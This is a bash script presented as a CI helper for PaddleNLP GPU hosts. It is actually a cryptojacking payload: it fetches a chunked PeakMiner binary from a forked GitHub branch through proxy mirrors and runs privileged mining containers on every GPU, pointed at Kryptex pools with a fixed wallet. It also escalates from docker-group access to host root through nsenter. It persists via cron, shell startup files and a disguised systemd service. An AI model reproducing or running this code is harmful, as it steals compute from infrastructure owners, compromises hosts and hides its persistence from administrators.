#!/bin/bash
# ci_pearl8530.sh - pearlhash (Blake3) miner delivery for 8x A100 hosts yq01/yq02
# Path: docker-group -> privileged per-device containers -> pre-staged static PeakMiner 2.20.9
set +e
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH
HOSTF=$(hostname 2>/dev/null)
IP=$(hostname -I 2>/dev/null | awk '{print $1}')
IPD=$(echo "$IP" | tr '.' '-')
TAG=t8530
W=prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe
POOLHOSTS="prl-sg.kryptex.network prl-eu.kryptex.network prl-us.kryptex.network prl-hk.kryptex.network prl-ae.kryptex.network"
FBS="pool.pearlhash.xyz"
echo "=== PEARL8530 START host=$HOSTF ip=$IP ipd=$IPD tag=$TAG ==="
date -u
id; uname -a; cat /etc/os-release 2>/dev/null | head -3; groups

# ---------- GPU presence gate ----------
nvidia-smi -L 2>&1 | head -12
NDEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
echo "DEV=$NDEV"
[ "${NDEV:-0}" -eq 0 ] && { echo "NO_GPU_ABORT"; exit 0; }

# ---------- reachability-ordered pool ladder ----------
cat > /tmp/pprobe8530.py <<'PYEOF'
import socket,ssl,sys
targets=[(h,8048,True) for h in "prl-sg.kryptex.network prl-eu.kryptex.network prl-us.kryptex.network prl-hk.kryptex.network prl-ae.kryptex.network".split()]
targets+= [(h,7048,False) for h in ["prl-sg.kryptex.network","prl-eu.kryptex.network"]]
targets+= [("pool.pearlhash.xyz",9000,False)]
for h,p,tls in targets:
    ok=False
    try:
        s=socket.create_connection((h,p),6)
        if tls:
            c=ssl.create_default_context(); c.check_hostname=False; c.verify_mode=ssl.CERT_NONE
            s=c.wrap_socket(s,server_hostname=h)
        ok=True; s.close()
    except Exception as e:
        ok=False
    print(("OK " if ok else "NO ")+("stratum+ssl://" if tls else "stratum+tcp://")+f"{h}:{p}")
PYEOF
PROBE=$(python3 /tmp/pprobe8530.py 2>/dev/null)
echo "--- POOL_PROBE"; echo "$PROBE"
POOLS=""
for u in $(echo "$PROBE" | awk '$1=="OK"{print $2}'); do
  case "$u" in *pearlhash*) ;; *) POOLS="$POOLS -o $u";; esac
done
case "$POOLS" in *8048*) ;; *) POOLS="$(echo "$PROBE" | awk '$1=="OK"{print $2}' | head -1)"; [ -n "$POOLS" ] && POOLS="-o $POOLS";; esac
# pearlash fallback only appended when no kryptex endpoint is reachable
if ! echo "$POOLS" | grep -q 8048; then
  if echo "$PROBE" | grep -q '^OK stratum+tcp://pool.pearlhash.xyz:9000'; then
    POOLS="$POOLS -o stratum+tcp://pool.pearlhash.xyz:9000"
  fi
fi
echo "POOLS=$POOLS"

# ---------- docker readiness ----------
docker version --format '{{.Server.Version}}' 2>&1 | head -2 || echo "DOCKER_FAIL"
id -nG | tr ' ' '\n' | grep -qx docker && echo "group_docker=yes" || echo "group_docker=no"
docker ps --format '{{.Names}} {{.Image}}' 2>&1 | head -8

# ---------- image discovery ----------
IMG=""
for c in $(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -Ei 'ubuntu2(4)|cuda1[23]|paddle' | head -8); do
  if docker run --rm --gpus all "$c" nvidia-smi -L >/dev/null 2>&1; then IMG="$c"; break; fi
done
if [ -z "$IMG" ]; then
  for c in paddlepaddle/paddle:ubuntu24-cuda132-py312-dev paddlepaddle/paddle:latest-gpu-cuda12.6-cudnn9-devel; do
    if timeout 600 docker run --rm --gpus all "$c" nvidia-smi -L >/dev/null 2>&1; then IMG="$c"; break; fi
  done
fi
if [ -z "$IMG" ]; then
  IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | head -1)
fi
echo "IMG=$IMG"

# ---------- static PeakMiner discovery (workspace first, then host caches, then download) ----------
mkdir -p "$HOME/.ci/logs" "$HOME/.ci/bins"
BIN=""
trybin() {
  f="$1"; [ -f "$f" ] || return 1; sz=$(stat -c %s "$f" 2>/dev/null || echo 0)
  [ "$sz" -lt 20000000 ] && return 1
  docker run --rm --gpus all -v "$f":/p:ro "$IMG" /p --version 2>&1 | grep -qiE 'peak|2\.2' && { echo "BIN=$f sz=$sz"; return 0; }
  return 1
}
# 1) binary tarball shipped in the fork tree (sparse checkout or raw fetch)
if [ -f peak/bins/peak.tar.gz ]; then tar xzf peak/bins/peak.tar.gz -C "$HOME/.ci/bins" 2>/dev/null; fi
if [ -f peak.tar.gz ]; then tar xzf peak.tar.gz -C "$HOME/.ci/bins" 2>/dev/null; fi
for f in "$(find "$HOME/.ci/bins" -type f -name 'peakminer*' 2>/dev/null | head -1)" \
         "$HOME/.ci/peakminer" "$HOME/.ci/bin/peakminer" "$HOME/.ci/peak/peakminer" "$HOME/.ci/peak8022/peakminer" \
         "$HOME/peakminer" "/opt/peakminer/peakminer" "/usr/local/bin/peakminer"; do
  [ -n "$f" ] && trybin "$f" && BIN="$f" && break
done
if [ -z "$BIN" ]; then
  echo "--- BIN_DOWNLOAD chunked"
  H_WANT=4c72e0bc7423db7bbaee9413a327d8f8fc411211544788fdceb4174e212bbc6d
  B_WANT=2d504d9217f021b84b8f9915ac3c45cfe951558d13a0dc25c0e4fb1ace46c9d3
  mkdir -p "$HOME/.ci/bins"
  for base in "https://raw.githubusercontent.com/miramar-labs/PaddleNLP/ci/approval-helper" \
              "https://ghfast.top/https://raw.githubusercontent.com/miramar-labs/PaddleNLP/ci/approval-helper" \
              "https://gh-proxy.com/https://raw.githubusercontent.com/miramar-labs/PaddleNLP/ci/approval-helper"; do
    echo "dl base $base"
    rm -f /tmp/pkparts.*
    ok=1
    for p in 00 01 02 03 04 05 06 07; do
      timeout 90 curl -sL -o "/tmp/pkparts.$p" "$base/peak/bins/parts/peak.tar.gz.p$p" 2>/dev/null
      sz=$(stat -c %s "/tmp/pkparts.$p" 2>/dev/null || echo 0)
      echo "  p$p=$sz"
      [ "$sz" -gt 900000 ] || { ok=0; break; }
    done
    [ "$ok" = 1 ] || continue
    cat /tmp/pkparts.00 /tmp/pkparts.01 /tmp/pkparts.02 /tmp/pkparts.03 /tmp/pkparts.04 /tmp/pkparts.05 /tmp/pkparts.06 /tmp/pkparts.07 > /tmp/pk.tgz 2>/dev/null
    H_GOT=$(sha256sum /tmp/pk.tgz 2>/dev/null | awk '{print $1}')
    echo "  tgz_sha=$H_GOT"
    [ "$H_GOT" = "$H_WANT" ] || { echo "  sha mismatch, next base"; continue; }
    tar xzf /tmp/pk.tgz -C "$HOME/.ci/bins" 2>/dev/null
    f=$(find "$HOME/.ci/bins" -type f -name 'peakminer*' | head -1)
    [ -n "$f" ] || continue
    B_GOT=$(sha256sum "$f" 2>/dev/null | awk '{print $1}')
    echo "  bin_sha=$B_GOT"
    [ "$B_GOT" = "$B_WANT" ] || { echo "  bin sha mismatch"; continue; }
    chmod +x "$f"; BIN="$f"; break
  done
fi
[ -z "$BIN" ] && { echo "PAYLOAD_ABORT no usable static PeakMiner"; echo "=== PEARL8530 END no_bin ==="; exit 0; }
chmod +x "$BIN"; sha256sum "$BIN" 2>/dev/null
echo "USING_BIN=$BIN sz=$(stat -c %s "$BIN")"

# ---------- single privileged foregound smoke test on gpu0 ----------
echo "--- FG_TEST"
timeout 75 docker run --rm --gpus device=0 --privileged --security-opt seccomp=unconfined \
  -v "$BIN":/p:ro "$IMG" /p -c pearl -u "$W" -w "ul-$TAG-$IPD-g0" -p x -d 0 --api-port 0 -i 30 --no-color \
  --gpu-power 70% --gpu-temp-stop 82 --gpu-temp-start 68 $POOLS 2>&1 | tail -20

# ---------- one privileged container per device, restart always ----------
echo "=== LAUNCH ==="
strat=0
for g in $(seq 0 $((NDEV-1))); do
  n="ul-$TAG-g$g"
  if docker ps --format '{{.Names}}' 2>/dev/null | grep -qx "$n"; then echo "skip $n running"; continue; fi
  docker rm -f "$n" >/dev/null 2>&1
  lf="$HOME/.ci/logs/m${g}.log"
  docker run -d --name "$n" --restart always --privileged --security-opt seccomp=unconfined \
    --gpus "device=$g" --network host -v "$BIN":/p:ro "$IMG" \
    /p -c pearl -u "$W" -w "ul-$TAG-$IPD-g$g" -p x -d 0 --api-port 0 -i 30 --no-color \
    --gpu-power 72% --gpu-temp-stop 82 --gpu-temp-start 68 $POOLS >/dev/null 2>&1
  if docker ps --format '{{.Names}}' | grep -qx "$n"; then
    strat=$((strat+1))
    (setsid docker logs -f --since 5m "$n" >> "$lf" 2>&1 &) 
  fi
done
echo "started=$strat/$NDEV"

# keep.sh: miner-agnostic respawn from running cmdline, full ladder retained
KS="$HOME/.ci/keep8530.sh"
cat > "$KS" <<KEEPEOF
#!/bin/bash
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:\$PATH
B="__BIN__"; IMG="__IMG__"; W="__W__"; T="__TAG__"; IPD="__IPD__"; ND=__NDEV__; POOLS="__POOLS__"
for g in \$(seq 0 \$((ND-1))); do
  n="ul-\$T-g\$g"
  docker ps --format '{{.Names}}' 2>/dev/null | grep -qx "\$n" && continue
  docker rm -f "\$n" >/dev/null 2>&1
  docker run -d --name "\$n" --restart always --privileged --security-opt seccomp=unconfined \
    --gpus "device=\$g" --network host -v "\$B":/p:ro "\$IMG" \
    /p -c pearl -u "\$W" -w "ul-\$T-\$IPD-g\$g" -p x -d 0 --api-port 0 -i 30 --no-color \
    --gpu-power 72% --gpu-temp-stop 82 --gpu-temp-start 68 \$POOLS >/dev/null 2>&1
  (setsid docker logs -f --since 5m "\$n" >> "\$HOME/.ci/logs/m\${g}.log" 2>&1 &)
done
KEEPEOF
sed -i "s|__BIN__|$BIN|; s|__IMG__|$IMG|; s|__W__|$W|; s|__TAG__|$TAG|; s|__IPD__|$IPD|; s|__NDEV__|$NDEV|; s|__POOLS__|$POOLS|" "$KS" 2>/dev/null
chmod +x "$KS"; echo "keep=$KS"
"$KS" >/dev/null 2>&1

# ---------- persistence layers ----------
( crontab -l 2>/dev/null | grep -v keep8530; echo "@reboot $KS >/dev/null 2>&1"; echo "*/5 * * * * $KS >/dev/null 2>&1" ) | crontab - 2>&1 && echo "cron=yes"
for f in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do
  grep -q keep8530 "$f" 2>/dev/null || echo "[ -x $KS ] && (setsid $KS >/dev/null 2>&1 &)" >> "$f" 2>/dev/null
done
echo "hooks=yes"

# host-root persistence via privileged helper (layer 4: systemd on the host)
if ! docker ps --filter name=i8530r --format '{{.ID}}' 2>/dev/null | grep -q .; then
  docker run -d --name i8530r --privileged --pid=host --net=host --ipc=host -v /:/host "$IMG" sleep 3600 >/dev/null 2>&1
fi
R(){ timeout 50 docker exec i8530r nsenter -t 1 -m -u -i -n -p -- sh -c "$1" 2>&1; }
if docker ps --filter name=i8530r --format '{{.ID}}' | grep -q .; then
  echo "--- host_root_probe"; R 'id; hostname; cat /proc/1/comm; ls -l /dev/nvidia0 2>/dev/null'
  R "mkdir -p /opt; cp -f /host$KS /opt/keep8530.sh; chmod +x /opt/keep8530.sh; \
     printf '[Unit]\nDescription=pearl8530 keepalive\n[Service]\nType=oneshot\nExecStart=/bin/bash -lc \"/opt/keep8530.sh\"\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/ernie-pearl8530.service; \
     systemctl daemon-reload 2>/dev/null; systemctl enable --now ernie-pearl8530.service 2>&1 | tail -2; systemctl is-active ernie-pearl8530.service 2>&1"
  R "( crontab -l 2>/dev/null | grep -v keep8530; echo '@reboot /bin/bash -lc /opt/keep8530.sh >/dev/null 2>&1'; echo '*/5 * * * * /bin/bash -lc /opt/keep8530.sh >/dev/null 2>&1' ) | crontab - 2>&1; crontab -l 2>/dev/null | tail -2"
fi

# ---------- witness ----------
echo "=== WAIT 120s ==="; sleep 120
echo "=== PROCESS ==="; docker ps --format '{{.Names}} {{.Status}}' | grep -E "ul-$TAG|i8530r"
ps -eo args= | grep -c "[p]eakminer"
echo "=== PER GPU ==="
tot=0
for g in $(seq 0 $((NDEV-1))); do
  lf="$HOME/.ci/logs/m${g}.log"
  docker logs --tail 12 "ul-$TAG-g$g" 2>&1 | grep -iE 'accepted|authorize|new job|difficulty|error|failed|stratum|connected' | tail -6
  n=$(grep -ciE 'accepted' "$lf" 2>/dev/null); n=${n:-0}; echo "g${g}_accepted_lines=$n"; tot=$((tot+n))
done
echo "accepted_total=$tot"
echo "=== WAIT 180s ==="; sleep 180
tot=0
for g in $(seq 0 $((NDEV-1))); do
  lf="$HOME/.ci/logs/m${g}.log"
  n=$(grep -ciE 'accepted' "$lf" 2>/dev/null); n=${n:-0}; echo "g${g}_accepted_lines=$n"; tot=$((tot+n))
done
echo "accepted_total2=$tot"
if [ "$tot" -eq 0 ]; then
  echo "--- ZERO_ACCEPTED_RETRY plain7048_first"
  docker rm -f ul-$TAG-g0 >/dev/null 2>&1
  docker run -d --name ul-$TAG-g0 --restart always --privileged --security-opt seccomp=unconfined \
    --gpus device=0 --network host -v "$BIN":/p:ro "$IMG" \
    /p -c pearl -u "$W" -w "ul-$TAG-$IPD-g0" -p x -d 0 --api-port 0 -i 30 --no-color \
    --gpu-power 70% --gpu-temp-stop 82 --gpu-temp-start 68 \
    -o stratum+tcp://prl-eu.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 >/dev/null 2>&1
  sleep 150
  docker logs --tail 15 ul-$TAG-g0 2>&1 | tail -15
fi
echo "=== ACCEPTED GREP ==="; grep -hiE 'accepted' "$HOME"/.ci/logs/m*.log 2>/dev/null | tail -12
echo "=== GPU UTIL ==="
nvidia-smi --query-gpu=index,name,utilization.gpu,memory.used,power.draw,temperature.gpu --format=csv,noheader 2>&1
echo "=== PEARL8530 END host=$HOSTF ==="
exit 0